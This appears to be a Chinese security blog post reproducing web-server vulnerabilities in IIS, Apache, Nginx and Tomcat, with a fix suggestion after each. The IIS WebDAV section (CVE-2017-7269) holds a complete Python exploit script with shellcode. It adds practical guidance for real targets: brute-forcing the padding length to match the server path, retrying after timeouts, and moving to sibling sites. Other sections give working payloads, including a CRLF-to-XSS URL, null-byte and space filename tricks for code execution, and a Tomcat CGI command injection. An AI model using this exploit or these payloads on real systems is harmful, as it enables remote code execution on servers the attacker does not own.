+<p>这个漏洞有几个需要注意的地方，如下。</p>
+<p>由于作者提供的Exp执行之后就卡在那里了，因此不适合用弹计算机的shellcode进行测试，网上找了个dalao的回显shellcode来测试。</p>
+<p>首先将上图中python2 IDE运行时产生的Raw类型的HTTP数据包copy保存至记事本中，然后在Burp Repeater模块 Paste from file。</p>
+<p>将shellcode更换成如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJIOPKSKPKPTKLITKKQDKU0G0KPKPM00QQXI8KPM0M0K8KPKPKPM0QNTKKNU397O00WRJKPSSI7KQR72JPXKOXPP3GP0PPP36VXLKM1VZM0LCKNSOKON2KPOSRORN3D35RND4NMPTD9RP2ENZMPT4352XCDNOS8BTBMBLLMKZOSROBN441URNT4NMPL2ERNS7SDBHOJMPNQ03LMLJPXNM1J13OWNMOS2H352CBKOJO0PCQFOUNMOB00NQNWNMP7OBP6OILMKZLMKZ130V15NMP2P0NQP7NMNWOBNV09KPM0A</div></pre></td></tr></table></figure></p>
+<p>结果：<br><img src="/2019/03/04/middleware/CVE-2017-7269-02.png" alt="CVE-2017-7269-02"></p>
+<p>CVE作者给出的Exp是在默认端口，默认域名，默认路径的情况下适用。</p>
+<p>第一个需要注意的是端口和域名绑定问题：</p>
+<p>当端口改变时，If头信息中的两个url端口要与站点端口一致，如下。<br><img src="/2019/03/04/middleware/CVE-2017-7269-03.png" alt="CVE-2017-7269-03"></p>
+<p>当域名改变时，If头信息中的两个url域名要与站点域名一致，且HOST头也要与站点域名一致。如下<br><img src="/2019/03/04/middleware/CVE-2017-7269-04.png" alt="CVE-2017-7269-04"></p>
+<p>不修改Host将返回502,如下<br><img src="/2019/03/04/middleware/CVE-2017-7269-05.png" alt="CVE-2017-7269-05"></p>
+<p>Note:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">测试的时候凡是需要修改IIS配置的操作，修改完毕后都需要重启IIS，</div><div class="line">或者在不超过禁用阈值的前提下结束w3wp进程。</div></pre></td></tr></table></figure></p>
+<p>第二个需要注意的是物理路径问题：</p>
+<p>CVE作者提供的Exp是在 默认路径长度等于19(包括结尾的反斜杠)的情况下适用，IIS默认路径一般为：<code>c:\inetpub\wwwroot</code></p>
+<p>解决方法：</p>
+<p>当路径长度小于19时需要对padding进行添加。<br>当路径长度大于19时需要对padding进行删除。</p>
+<p>ROP和stackpivot前面的padding实际上为UTF8编码的字符，每三个字节解码后变为两个字节的UTF16字符，在保证Exp不出错的情况下，有0x58个字符是没用的。所以可以将前0x108个字节删除，换成0x58个a或b。</p>
+<p>原exp 修改后如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># coding:utf-8</span></div><div class="line"><span class="keyword">import</span> socket  </div><div class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  </div><div class="line">sock.connect((<span class="string">'192.168.124.129'</span>,<span class="number">8888</span>))  </div><div class="line">pay=<span class="string">'PROPFIND / HTTP/1.1\r\nHost: www.lxhsec.com\r\nContent-Length: 0\r\n'</span></div><div class="line">pay+=<span class="string">'If: &lt;http://www.lxhsec.com:8888/aaaaaaa'</span></div><div class="line">pay+=<span class="string">'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'</span></div><div class="line">pay+=<span class="string">'\xe6\xa9\xb7\xe4\x85\x84\xe3\x8c\xb4\xe6\x91\xb6\xe4\xb5\x86\xe5\x99\x94\xe4\x9d\xac\xe6\x95\x83\xe7\x98\xb2\xe7\x89\xb8\xe5\x9d\xa9\xe4\x8c\xb8\xe6\x89\xb2\xe5\xa8\xb0\xe5\xa4\xb8\xe5\x91\x88\xc8\x82\xc8\x82\xe1\x8b\x80\xe6\xa0\x83\xe6\xb1\x84\xe5\x89\x96\xe4\xac\xb7\xe6\xb1\xad\xe4\xbd\x98\xe5\xa1\x9a\xe7\xa5\x90\xe4\xa5\xaa\xe5\xa1\x8f\xe4\xa9\x92\xe4\x85\x90\xe6\x99\x8d\xe1\x8f\x80\xe6\xa0\x83\xe4\xa0\xb4\xe6\x94\xb1\xe6\xbd\x83\xe6\xb9\xa6\xe7\x91\x81\xe4\x8d\xac\xe1\x8f\x80\xe6\xa0\x83\xe5\x8d\x83\xe6\xa9\x81\xe7\x81\x92\xe3\x8c\xb0\xe5\xa1\xa6\xe4\x89\x8c\xe7\x81\x8b\xe6\x8d\x86\xe5\x85\xb3\xe7\xa5\x81\xe7\xa9\x90\xe4\xa9\xac'</span></div><div class="line">pay+=<span class="string">'&gt;'</span></div><div class="line">pay+=<span class="string">' (Not &lt;locktoken:write1&gt;) &lt;http://www.lxhsec.com:8888/bbbbbbb'</span></div><div class="line">pay+=<span class="string">'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb'</span></div><div class="line">pay+=<span class="string">'\xe5\xa9\x96\xe6\x89\x81\xe6\xb9\xb2\xe6\x98\xb1\xe5\xa5\x99\xe5\x90\xb3\xe3\x85\x82\xe5\xa1\xa5\xe5\xa5\x81\xe7\x85\x90\xe3\x80\xb6\xe5\x9d\xb7\xe4\x91\x97\xe5\x8d\xa1\xe1\x8f\x80\xe6\xa0\x83\xe6\xb9\x8f\xe6\xa0\x80\xe6\xb9\x8f\xe6\xa0\x80\xe4\x89\x87\xe7\x99\xaa\xe1\x8f\x80\xe6\xa0\x83\xe4\x89\x97\xe4\xbd\xb4\xe5\xa5\x87\xe5\x88\xb4\xe4\xad\xa6\xe4\xad\x82\xe7\x91\xa4\xe7\xa1\xaf\xe6\x82\x82\xe6\xa0\x81\xe5\x84\xb5\xe7\x89\xba\xe7\x91\xba\xe4\xb5\x87\xe4\x91\x99\xe5\x9d\x97\xeb\x84\x93\xe6\xa0\x80\xe3\x85\xb6\xe6\xb9\xaf\xe2\x93\xa3\xe6\xa0\x81\xe1\x91\xa0\xe6\xa0\x83\xcc\x80\xe7\xbf\xbe\xef\xbf\xbf\xef\xbf\xbf\xe1\x8f\x80\xe6\xa0\x83\xd1\xae\xe6\xa0\x83\xe7\x85\xae\xe7\x91\xb0\xe1\x90\xb4\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81\xe9\x8e\x91\xe6\xa0\x80\xe3\xa4\xb1\xe6\x99\xae\xe4\xa5\x95\xe3\x81\x92\xe5\x91\xab\xe7\x99\xab\xe7\x89\x8a\xe7\xa5\xa1\xe1\x90\x9c\xe6\xa0\x83\xe6\xb8\x85\xe6\xa0\x80\xe7\x9c\xb2\xe7\xa5\xa8\xe4\xb5\xa9\xe3\x99\xac\xe4\x91\xa8\xe4\xb5\xb0\xe8\x89\x86\xe6\xa0\x80\xe4\xa1\xb7\xe3\x89\x93\xe1\xb6\xaa\xe6\xa0\x82\xe6\xbd\xaa\xe4\x8c\xb5\xe1\x8f\xb8\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81'</span></div><div class="line">shellcode=<span class="string">'VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJIOPKSKPKPTKLITKKQDKU0G0KPKPM00QQXI8KPM0M0K8KPKPKPM0QNTKKNU397O00WRJKPSSI7KQR72JPXKOXPP3GP0PPP36VXLKM1VZM0LCKNSOKON2KPOSRORN3D35RND4NMPTD9RP2ENZMPT4352XCDNOS8BTBMBLLMKZOSROBN441URNT4NMPL2ERNS7SDBHOJMPNQ03LMLJPXNM1J13OWNMOS2H352CBKOJO0PCQFOUNMOB00NQNWNMP7OBP6OILMKZLMKZ130V15NMP2P0NQP7NMNWOBNV09KPM0A'</span></div><div class="line">pay+=shellcode</div><div class="line">pay+=<span class="string">'&gt;\r\n\r\n'</span></div><div class="line"><span class="keyword">print</span> pay</div><div class="line">sock.send(pay)  </div><div class="line">data = sock.recv(<span class="number">80960</span>)  </div><div class="line"><span class="keyword">print</span> data </div><div class="line">sock.close</div></pre></td></tr></table></figure></p>
+<p>执行：<br><img src="/2019/03/04/middleware/CVE-2017-7269-07.png" alt="CVE-2017-7269-07"></p>
+<p>当路径长度小于19时，如下，需要增加12个a，b<br><img src="/2019/03/04/middleware/CVE-2017-7269-08.png" alt="CVE-2017-7269-08"></p>
+<p><img src="/2019/03/04/middleware/CVE-2017-7269-10.png" alt="CVE-2017-7269-10"></p>
+<p>而实际中路径常常大于19，需要对padding进行删除。</p>
+<p>当路径为<code>c:\www\</code>的时候，a有107个，加起来有114个，除去盘符有111个字符，所以可以把Exp的padding增加至111，并逐次进行减少。当长度不匹配时返回500，成功时返回200，通过爆破方式得到物理路径长度。<br>成功:<br><img src="/2019/03/04/middleware/CVE-2017-7269-11.png" alt="CVE-2017-7269-11"></p>
+<p>失败:<br><img src="/2019/03/04/middleware/CVE-2017-7269-09.png" alt="CVE-2017-7269-09"></p>
+<p>当然如果能得到物理路径，则用114减去物理路径长度（包括末尾的反斜杠）就是所需的padding长度。</p>
+<p>第三个需要注意的是，超时问题。<br>当exp执行成功一段时间之后（大概十分钟到二十分钟左右，其间无论有无访问），再对这个站点执行exp永远不会成功，同时返回400。</p>
+<p>解决方法：<br>1.等待w3wp重启。<br>2.测试旁站（因为每个池都是独立的w3wp进程，换一个可能在其他池的旁站进行尝试）</p>
+<p>第四个需要注意的是，多次执行错误shellcode</p>
+<p>多次执行错误的shellcode会覆盖很多不该覆盖的代码，从而导致正确的shellcode执行时也返回500，<br>提示信息为：参数不正确，也可能什么都不返回。</p>
+<p><img src="/2019/03/04/middleware/CVE-2017-7269-06.png" alt="CVE-2017-7269-06"></p>
+<p>解决方法：<br>1.等待w3wp重启。<br>2.测试旁站（因为每个池都是独立的w3wp进程，换一个可能在其他池的旁站进行尝试）</p>
+<h3 id="修复建议-5"><a href="#修复建议-5" class="headerlink" title="修复建议"></a>修复建议</h3><p>关闭 WebDAV</p>
+<h1 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h1><p>Apache是世界使用排名第一的Web服务器软件。它可以运行在几乎所有广泛使用的计算机平台上，由于其跨平台和安全性被广泛使用，是最流行的Web服务器端软件之一。它快速、可靠并且可通过简单的API扩充，将Perl/Python等解释器编译到服务器中。</p>
+<h2 id="解析漏洞-1"><a href="#解析漏洞-1" class="headerlink" title="解析漏洞"></a>解析漏洞</h2><h3 id="未知扩展名解析漏洞"><a href="#未知扩展名解析漏洞" class="headerlink" title="未知扩展名解析漏洞"></a>未知扩展名解析漏洞</h3><p>Apache的解析漏洞依赖于一个特性： <strong>Apache默认一个文件可以有多个以点分割的后缀，当最右边的后缀无法识别（不在mime.types文件内），则继续向左识别，直到识别到合法后缀才进行解析。</strong></p>
+<p>复现：<br>这里使用phpstudy进行复现。<br>下载地址：<br><a href="http://phpstudy.php.cn/phpstudy/phpStudy(PHP5.2).zip" target="_blank" rel="external">http://phpstudy.php.cn/phpstudy/phpStudy(PHP5.2).zip</a></p>
+<p>访问phpinfo.php.xxx<br><img src="/2019/03/04/middleware/apachePaser1.png" alt="apachePaser1"></p>
+<p>实战中可以上传rar，owf等文件进行利用，如果上传phpinfo.php.jpg，即使文件名中有.php，也会直接解析为jpg。因为Apache认识.jpg,停止继续向左识别。</p>
+<h3 id="AddHandler导致的解析漏洞。"><a href="#AddHandler导致的解析漏洞。" class="headerlink" title="AddHandler导致的解析漏洞。"></a>AddHandler导致的解析漏洞。</h3><p>如果运维人员给.php后缀增加了处理器：<br><code>AddHandler application/x-httpd-php .php</code><br>那么，在有多个后缀的情况下，只要一个文件名中含有.php后缀，即被识别成PHP文件，没必要是最后一个后缀。<br>利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。</p>
+<p>复现：<br><img src="/2019/03/04/middleware/apachePaser2.png" alt="apachePaser2"></p>
+<p>即使最右边的文件格式是在mime.types文件内，只要文件名中出现.php，就直接被解析为php。</p>
+<h3 id="Apache-HTTPD-换行解析漏洞（CVE-2017-15715）"><a href="#Apache-HTTPD-换行解析漏洞（CVE-2017-15715）" class="headerlink" title="Apache HTTPD 换行解析漏洞（CVE-2017-15715）"></a>Apache HTTPD 换行解析漏洞（CVE-2017-15715）</h3><p>影响范围：2.4.0~2.4.29版本<br>环境：phpstudy2014 Apache + PHP5.4n</p>
+<p>此漏洞形成的根本原因，在于<code>$</code>, 正则表达式中<code>$</code>不仅匹配字符串结尾位置，也可以匹配<code>\n</code> 或 <code>\r</code></p>
+<p>在解析PHP时，1.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;FilesMatch \.php$&gt;</div><div class="line">    SetHandler application/x-httpd-php</div><div class="line">&lt;/FilesMatch&gt;</div></pre></td></tr></table></figure></p>
+<p>测试代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">&lt;body&gt;</div><div class="line">    &lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</div><div class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</div><div class="line">    &lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt;</div><div class="line">    &lt;input type=&quot;submit&quot; value=&quot;上传文件&quot; /&gt;</div><div class="line">    &lt;/form&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div><div class="line">&lt;?php</div><div class="line">if(isset($_FILES[&apos;file&apos;])) &#123;</div><div class="line">    $name = basename($_POST[&apos;name&apos;]);</div><div class="line">    $ext = pathinfo($name,PATHINFO_EXTENSION);</div><div class="line">    if(in_array($ext, [&apos;php&apos;, &apos;php3&apos;, &apos;php4&apos;, &apos;php5&apos;, &apos;phtml&apos;, &apos;pht&apos;])) &#123;</div><div class="line">        exit(&apos;bad file&apos;);</div><div class="line">    &#125;</div><div class="line">echo &quot;ok&quot;;</div><div class="line">    move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;], &apos;./&apos; . $name);</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
+<p><img src="/2019/03/04/middleware/apachePaser4.png" alt="apachePaser4"><br>点击Go后，效果如下:<br><img src="/2019/03/04/middleware/apachePaser3.png" alt="apachePaser3"></p>
+<p>相同代码在Linux下进行测试，可以正常写入。<br><img src="/2019/03/04/middleware/CVE-2017-15715-01.png" alt="CVE-2017-15715-01"></p>
+<p>访问：<br><img src="/2019/03/04/middleware/CVE-2017-15715-02.png" alt="CVE-2017-15715-02"></p>
+<p>限制：获取文件名时不能用$_FILES[‘file’][‘name’]，因为它会自动把换行去掉。<br><img src="/2019/03/04/middleware/CVE-2017-15715-03.png" alt="CVE-2017-15715-03"></p>
+<h3 id="修复建议-6"><a href="#修复建议-6" class="headerlink" title="修复建议"></a>修复建议</h3><ol>
+<li>升级到最新版本</li>
+<li>或将上传的文件重命名为为时间戳+随机数+.jpg的格式并禁用上传文件目录执行脚本权限。</li>
+</ol>
+<h1 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h1><p>Nginx是一款轻量级的Web 服务器/反向代理服务器及电子邮件（IMAP/POP3）代理服务器，在BSD-like 协议下发行。其特点是占有内存少，并发能力强，事实上nginx的并发能力确实在同类型的网页服务器中表现较好，</p>
+<h2 id="Nginx配置文件错误导致的解析漏洞"><a href="#Nginx配置文件错误导致的解析漏洞" class="headerlink" title="Nginx配置文件错误导致的解析漏洞"></a>Nginx配置文件错误导致的解析漏洞</h2><p>对于任意文件名，在后面添加/xxx.php（xxx为任意字符）后,即可将文件作为php解析。<br>例：info.jpg后面加上/xxx.php，会将info.jpg 以php解析。</p>
+<p>这里使用phpstudy2014 ，Nginx + PHP5.3n进行复现(以下复现若无特别说明均采用此环境)<br>结果：<br><img src="/2019/03/04/middleware/nginx1.png" alt="nginx1"></p>
+<p>该漏洞是Nginx配置所导致，与Nginx版本无关，下面是常见的漏洞配置。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">server &#123;</div><div class="line">    location ~ \.php$ &#123;</div><div class="line">        root           /work/www/test;</div><div class="line">        fastcgi_index  index.php;</div><div class="line">        fastcgi_param  SCRIPT_FILENAME    </div><div class="line">	$document_root$fastcgi_script_name;</div><div class="line">        include        fastcgi_params;</div><div class="line">        fastcgi_pass   unix:/tmp/php-fpm.sock;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>当攻击者访问/info.jpg/xxx.php时， Nginx将查看URL，看到它以.php结尾，并将路径传递给PHP fastcgi处理程序。<br>Nginx传给php的路径为<code>c:/WWW/info.jpg/xxx.php</code>,<br>在phpinfo中可以查看<code>_SERVER[&quot;ORIG_SCRIPT_FILENAME&quot;]</code>得到。<br><img src="/2019/03/04/middleware/nginx3.png" alt="nginx3"><br>PHP根据URL映射，在服务器上寻找xxx.php文件，但是xxx.php不存在，又由于cgi.fix_pathinfo默认是开启的，因此PHP 会继续检查路径中存在的文件，并将多余的部分当作 PATH_INFO。接着PHP在文件系统中找到.jpg文件，而后以PHP的形式执行.jpg的内容，并将/xxx.php存储在 PATH_INFO 后丢弃，因此我们在phpinfo中的<code>$_SERVER[&#39;PATH_INFO&#39;]</code>看的到值为空。</p>
+<p>Note:<strong>php的一个选项：cgi.fix_pathinfo，该选项默认开启，值为1，用于修理路径，</strong><br>例如：当php遇到文件路径”/info.jpg/xxx.php/lxh.sec”时，若”/info.jpg/xxx.php/lxh.sec”不存在，则会去掉最后的”/lxh.sec”，然后判断”/info.jpg/xxx.php”是否存在, 若存在则将/info.jpg/xxx.php当作文件/info.jpg/xxx.php/lxh.sec，若/info.jpg/xxx.php仍不存在，则继续去掉xxx.php,依此类推。</p>
+<h3 id="修复建议-7"><a href="#修复建议-7" class="headerlink" title="修复建议"></a>修复建议</h3><p>1.配置cgi.fix_pathinfo(php.ini中)为0并重启php-cgi程序<br><img src="/2019/03/04/middleware/iis7-01.png" alt="iis7-01"></p>
+<p>结果：<br><img src="/2019/03/04/middleware/nginx2.png" alt="nginx2"></p>
+<p>2.或如果需要使用到cgi.fix_pathinfo这个特性（例如：Wordpress），那么可以禁止上传目录的执行脚本权限。<br>或将上传存储的内容与网站分离，即站库分离。</p>
+<p>3.或高版本PHP提供了security.limit_extensions这个配置参数，设置<code>security.limit_extensions = .php</code></p>
+<h2 id="Nginx-空字节任意代码执行漏洞"><a href="#Nginx-空字节任意代码执行漏洞" class="headerlink" title="Nginx 空字节任意代码执行漏洞"></a>Nginx 空字节任意代码执行漏洞</h2><p>影响版本：Nginx <code>0.5*</code>, <code>0.6*</code>,<code>0.7 &lt;= 0.7.65</code>,<code>0.8 &lt;= 0.8.37</code></p>
+<p>这里提供个打包好的Windows环境 Nginx 0.7.65+php 5.3.2</p>
+<p>链接：<a href="https://pan.baidu.com/s/1FUVJv9iFCcX9Qp5D5AMxKw" target="_blank" rel="external">https://pan.baidu.com/s/1FUVJv9iFCcX9Qp5D5AMxKw</a><br>提取码：imdm </p>
+<p>解压后，在Nginx目录下执行startup.bat</p>
+<p>然后在<code>nginx-0.7.65/html/</code>目录下创建info.jpg,内容为<code>&lt;?php phpinfo();?&gt;</code>,</p>
+<p>访问<code>info.jpg</code>，并抓包，修改为<code>info.jpg..php</code>，在Hex选修卡中将jpg后面的<code>.</code>，更改为<code>00</code>.</p>
+<p><img src="/2019/03/04/middleware/NginxNullbyte01.png" alt="NginxNullbyte01"></p>
+<p>Note:该漏洞不受<code>cgi.fix_pathinfo</code>影响，当其为0时，依旧解析。</p>
+<h3 id="修复建议-8"><a href="#修复建议-8" class="headerlink" title="修复建议"></a>修复建议</h3><p>升级Nginx版本</p>
+<h2 id="Nginx-文件名逻辑漏洞（CVE-2013-4547）"><a href="#Nginx-文件名逻辑漏洞（CVE-2013-4547）" class="headerlink" title="Nginx 文件名逻辑漏洞（CVE-2013-4547）"></a>Nginx 文件名逻辑漏洞（CVE-2013-4547）</h2><p>影响版本：Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7</p>
+<p>在Windows弄了个环境，后来发现要文件名的后面存在空格，而Windows是不允许存在此类文件的，因此这里复现，使用Vulhub的docker进行复现。</p>
+<p>访问<code>http://your-ip:8080/</code> 上传文件<br><img src="/2019/03/04/middleware/NginxCVE-2013-4547-01.png" alt="NginxCVE-2013-4547-01"></p>
+<p>访问<code>http://your-ip:8080/uploadfiles/info.jpg</code>, 并抓包，修改为<code>info.jpg...php</code>, 在Hex选修卡中将jpg后面的两个点<code>2e</code>改成<code>20</code>,<code>00</code><br>点击Go,如下。<br><img src="/2019/03/04/middleware/NginxCVE-2013-4547-02.png" alt="NginxCVE-2013-4547-02"></p>
+<p>Note:该漏洞不受<code>cgi.fix_pathinfo</code>影响，当其为0时，依旧解析，在Windows上有所限制。</p>
+<h3 id="修复建议-9"><a href="#修复建议-9" class="headerlink" title="修复建议"></a>修复建议</h3><ol>
+<li>设置security.limit_extensions = .php</li>
+<li>或升级Nginx</li>
+</ol>
+<h2 id="Nginx-配置错误导致的安全问题"><a href="#Nginx-配置错误导致的安全问题" class="headerlink" title="Nginx 配置错误导致的安全问题"></a>Nginx 配置错误导致的安全问题</h2><h3 id="CRLF注入"><a href="#CRLF注入" class="headerlink" title="CRLF注入"></a>CRLF注入</h3><p>查看Nginx文档，可以发现有三个表示uri的变量：<br>1.$uri<br>2.$document_uri<br>3.$request_uri</p>
+<p>1和2表示的是解码以后的请求路径，不带参数；3表示的是完整的URI（没有解码）</p>
+<p>Nginx会将1，2进行解码，导致传入%0a%0d即可引入换行符，造成CRLF注入漏洞。</p>
+<p>错误配置:<br><img src="/2019/03/04/middleware/nginxcrlf0.png" alt="nginxcrlf0"></p>
+<p>访问：<br><code>http://127.0.0.1/%0aX-XSS-Protection:%200%0a%0d%0a%0d%3Cimg%20src=1%20onerror=alert(/xss/)%3E</code><br>将返回包的Location端口设置为小于80，使得浏览器不进行跳转，执行XSS。<br><img src="/2019/03/04/middleware/nginxcrlf2.png" alt="nginxcrlf2"><br>结果：<br><img src="/2019/03/04/middleware/nginxcrlf1.png" alt="nginxcrlf1"></p>
+<h4 id="修复建议-10"><a href="#修复建议-10" class="headerlink" title="修复建议"></a>修复建议</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">location / &#123;</div><div class="line">    return 302 https://$host$request_uri;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h3 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h3><p>Nginx在配置别名（Alias）的时候，如果忘记加/，将造成一个目录穿越漏洞。</p>
+<p>错误的配置文件示例（原本的目的是为了让用户访问到C:/WWW/home/目录下的文件）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">location /files &#123;</div><div class="line">	autoindex on;</div><div class="line">	alias c:/WWW/home/;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>结果：<br><img src="/2019/03/04/middleware/nginxdirthrough.png" alt="nginxdirtraversal"></p>
+<h4 id="修复建议-11"><a href="#修复建议-11" class="headerlink" title="修复建议"></a>修复建议</h4><p>只需要保证location和alias的值都有后缀/或都没有/这个后缀。</p>
+<h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><p>当Nginx配置文件中，autoindex 的值为on时，将造成一个目录遍历漏洞。</p>
+<p><img src="/2019/03/04/middleware/nginxdirtraversal1.png" alt="nginxdirtraversal1"></p>
+<p>结果:<br><img src="/2019/03/04/middleware/nginxdirtraversal2.png" alt="nginxdirtraversal2"></p>
+<h4 id="修复建议-12"><a href="#修复建议-12" class="headerlink" title="修复建议"></a>修复建议</h4><p>将autoindex 的值为置为off。</p>
+<h3 id="add-header被覆盖"><a href="#add-header被覆盖" class="headerlink" title="add_header被覆盖"></a>add_header被覆盖</h3><p>Nginx的配置文件分为Server、Location等一些配置块，并且存在包含关系，子块会继承父块的一些选项，比如add_header。</p>
+<p>如下配置中，整站（父块中）添加了CSP头：<br><img src="/2019/03/04/middleware/nginxheader0.png" alt="nginxheader0"></p>
+<p>正常情况下访问:<br><img src="/2019/03/04/middleware/nginxheader1.png" alt="nginxheader1"></p>
+<p>当访问 /test2时，XSS被触发。因/test2的location中添加了X-Content-Type-Options头，导致父块中的add_header全部失效。</p>
+<p><img src="/2019/03/04/middleware/nginxheader2.png" alt="nginxheader2"></p>
+<h1 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h1><p>Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用 服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。对于一个初学者来说，可以这样认为，当在一台机器上配置好Apache 服务器，可利用它响应 HTML （ 标准通用标记语言下的一个应用）页面的访问请求。实际上Tomcat是Apache 服务器的扩展，但运行时它是独立运行的，所以当运行tomcat 时，它实际上作为一个与Apache 独立的进程单独运行的。</p>
+<h2 id="Tomcat-任意文件写入（CVE-2017-12615）"><a href="#Tomcat-任意文件写入（CVE-2017-12615）" class="headerlink" title="Tomcat 任意文件写入（CVE-2017-12615）"></a>Tomcat 任意文件写入（CVE-2017-12615）</h2><p>环境：Tomcat/8.0.30</p>
+<p>漏洞本质是Tomcat配置文件/conf/web.xml 配置了可写（readonly=false），导致我们可以往服务器写文件：</p>
+<p><img src="/2019/03/04/middleware/tomcatput1.png" alt="tomcatput1"></p>
+<p>增加完配置之后，记得重启Tomcat，效果如下:<br><img src="/2019/03/04/middleware/tomcatput2.png" alt="tomcatput2"></p>
+<p>当readonly=true时，效果如下。<br><img src="/2019/03/04/middleware/tomcatput3.png" alt="tomcatput3"></p>
+<h3 id="修复建议-13"><a href="#修复建议-13" class="headerlink" title="修复建议"></a>修复建议</h3><p>将readonly=true，默认为true。</p>
+<h2 id="Tomcat-远程代码执行（CVE-2019-0232）"><a href="#Tomcat-远程代码执行（CVE-2019-0232）" class="headerlink" title="Tomcat 远程代码执行（CVE-2019-0232）"></a>Tomcat 远程代码执行（CVE-2019-0232）</h2><p>影响范围：9.0.0.M1 ~ 9.0.17, 8.5.0 ~ 8.5.39 ， 7.0.0 ~ 7.0.93<br>影响系统： Windows</p>
+<p>测试环境：<br><a href="https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.39/bin/apache-tomcat-8.5.39-windows-x86.zip" target="_blank" rel="external">Apache Tomcat v8.5.39</a><br>JDK 1.8.0_144</p>
+<p>修改配置：<br>web.xml<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;init-param&gt;</div><div class="line">  &lt;param-name&gt;debug&lt;/param-name&gt;</div><div class="line">  &lt;param-value&gt;0&lt;/param-value&gt;</div><div class="line">&lt;/init-param&gt;</div><div class="line">&lt;init-param&gt;</div><div class="line">  &lt;param-name&gt;executable&lt;/param-name&gt;</div><div class="line">  &lt;param-value&gt;&lt;/param-value&gt;</div><div class="line">&lt;/init-param&gt;</div></pre></td></tr></table></figure></p>
+<p><img src="/2019/03/04/middleware/CVE-2019-0232-01.png" alt="CVE-2019-0232-01.png"></p>
+<p>content.xml<br><img src="/2019/03/04/middleware/CVE-2019-0232-02.png" alt="CVE-2019-0232-02.png"></p>
+<p>在<code>Tomcat\webapps\ROOT\WEB-INF</code>新建<code>cgi</code>目录，并创建<code>lxhsec.bat</code>文件，内容任意。</p>
+<p>访问<code>http://127.0.0.1:8080/cgi-bin/lxhsec.bat?&amp;dir</code><br><img src="/2019/03/04/middleware/CVE-2019-0232-03.png" alt="CVE-2019-0232-03.png"></p>
